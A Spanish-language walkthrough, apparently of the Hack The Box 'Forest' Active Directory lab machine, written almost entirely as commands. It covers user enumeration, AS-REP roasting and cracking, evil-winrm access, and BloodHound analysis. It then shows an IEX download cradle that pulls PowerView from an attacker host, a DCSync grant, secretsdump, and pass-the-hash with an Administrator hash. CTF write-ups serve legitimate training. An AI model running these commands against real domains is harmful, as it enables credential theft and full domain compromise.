---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Forest             |
| Os                     | Windows            |
| Difficulty             | Easy               |
| Points                 | 0                  |
| IP                     | 10.10.10.161       |

## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Forest/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.10.161
```

![nmap 1](/assets/images/Forest/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.161 -oG allPorts
```

![nmap2](/assets/images/Forest/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49936 10.10.10.161 -oN targeted
```

![nmap 3.1](/assets/images/Forest/nmap3.1.png)

![nmap 3.1](/assets/images/Forest/nmap3.2.png)

Este tercer escaneo ya nos mostro ms informacion sobre los puertos que estan expuestos, podremos empezar a enumerar servicios con:

```s
enum4linux -a 10.10.10.161
```

![enum4linux](/assets/images/Forest/enum4linux.png)

Este escaneo rapido, nos dio informacion relevante, ya que la maquina permite el acceso sin usuario ni contrasena y podremos ver que se encuentra dentro. Tambien nos permitio saber el tamano de las contrasenas, mas nombres de usuario y que existen grupos de remote access que posteriormente podremos usar con evil win.

```s
crackmapexec smb 10.10.10.161
crackmapexec smb 10.10.10.161 -u users -p credentials --continue-on-success
```

Incorporamos el dominio htb.local a nuestro /etc/hosts 

Como no tenemos credenciales todavia, podemos meter un

```s
smbclient -L 10.10.10.161 -N
```

Ya que sabemos que el usuario Anonymous esta habilitado, podemos probar una herramienta 

```s
rpcclient -U "" 10.10.10.161 -N
#enumdomusers para listar usuarios del dominio

rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > ../users.txt
```

Ya que podemos acceder a este servicio, podemos usar la<a href="https://github.com/s4vitar/rpcenum.git">herramienta</a> de s4vitar para enumerar mas informacion en este servicio 

Para usarla corremos un:

```s
sudo ./rpcenum -e DUsers -i 10.10.10.161
sudo ./rpcenum -e All -i 10.10.10.161
```

![Rpcenum](/assets/images/Forest/rpcenum.png)

Ahora podemos usar la herramienta de kali Impacket de la manera siguiente:

```s
impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt 2>/dev/null
```

Tenemos un usuario que si accedia a este servicio

![kerberos](/assets/images/Forest/kerberos_auth.png)

Como funciona esta vulnerabilidad? Pues si la contrasena de este usuario es debil, podriamos romperla.

```s
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![Password cracked](/assets/images/Forest/password_cracked.png)

Efectivamente, es debil su contrasena. Para validarla podemos usar un:

```s
crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

Ahoora lo que podemos hacer es:

```s
impacket-GetNPUsers htb.local/svc-alfresco:s3rvice@10.10.10.161 -dc-ip 10.10.10.161
```

Lo siguiente seria usar ldapdomaindump para listar kerberosbroadsting:
Primero nos desplazamos al directorio /var/www/html.
Segundo, ejecutamos:

```s
ldapdomaindump -u 'htb.local\svc-alfresco' -p 's3rvice' 10.10.10.161

service apache2 start
```

El resultado del comando anterior sera esto, y lo podremos visualizar si iniciamos despues el apache2

![ldapdomaindump](/assets/images/Forest/domain_dump.png)

![domain users](/assets/images/Forest/domain_users_by_group.png)

Tenemos ahora una forma mas chula de ver la informacion de la maquina.

Ahora lo que podemos hacer es:

```s
crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

Nos aparece powned, asi que ahora podemos tener ejecusion remota en la maquina.

```s
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

Podemos ahora visitar el desktop y visualizar la flag. Para escalar los privilegios ahora podemos usar Bloodhound.

```s
#instalacion
sudo apt install neo4j bloodhound -y

neo4j console
#pass default  usuario neo4j y contrasena ne4j
```

```s
bloodhound --nosandbox &> /dev/null &
disown
```
Tuve complicaciones para hacer compatible bloodhound con el siguiente injector, pero con la sigiente <a href="https://github.com/BloodHoundAD/BloodHound/releases/download/4.0.3/BloodHound-linux-x64.zip"> version</a> pude continuar.

Vamos a usar un injector de<a href="https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1"> github</a>, nos lo podemos descargar con un wget desde la vista raw.

Ahora en la maquina con el evil-win solo tenemos que darle un upload SharpHound.ps1

Despues haremos la importacion del modulo con un:

```powershell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

Con esto hemos terminado la recoleccion de informacion y ha sido guardado en el archivo .zip.

![BloodHound information recolection](/assets/images/Forest/bh_recolection.png)

Nos descargamos el archivo con un download. Y lo importamos en BloodHound ahora.

Ahora que esta cargado el .zip, podemos darle click en el menu del lado izquierdo y en la parte de analysis empezar a enumerar posibilidades de escalada de privilegios. En el siguiente ejemplo vemos a alfresco y podemos darle a la opcion de owned.

Find AS-REP Roastable Users (DontReqPreAuth) VIEW

![User own](/assets/images/Forest/import_bh.png)

Find Shortest Paths to Domain Admins

![Easy way to become admin](/assets/images/Forest/becoming_admin.png)

La siguiente vista nos describe que alfresco es miembro del grupo service account, que a su vez tambien es miembro de Priviliged IT Account, Account operators. Entonces podemos crear usuarios quizas con los permisos que queramos, procedemos a intentar lo siguiente:

```s
#Creamos el usuario rebick con su contrasena a nivel dominio
net user rebick rebick1234! /add /domain
#Listamos los grupos
net group
net group "Exchange Windows Permissions" rebick /add
```

![Rebick added](/assets/images/Forest/rebick_added.png)

BloodHound nos da todo, en la siguiente ventana habremos dado click derecho y seleccionar la opcion help para que la herramienta nos muestre los pasos para avanzar al siguiente paso.

![Help view](/assets/images/Forest/rebick_added.png)

Antes, descargaremos la herramienta que nos permitira escalar esto de<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"> github</a>. La cargamos a la maquina victima y la importamos abriendo un servidor de python y en la maquina windows:

```powershell
$SecPassword = ConvertTo-SecureString 'rebick1234!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\rebick', $SecPassword)

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.29/PowerView.ps1')
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity rebick -Rights DCSync
```

Y ahora que tenemos el permiso podemos ejecutar:

```s
impacket-secretsdump htb.local/rebick@10.10.10.161
```

![Credentials dumped](/assets/images/Forest/credentials_returned.png)

Ahora ya tenemos los hashes para el usuario Administrador tambien. Podemos ahora intentar crackear la contrasena o simplemente con el evil-winrm pasarle el hash de la manera siguiente:

```s
evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
```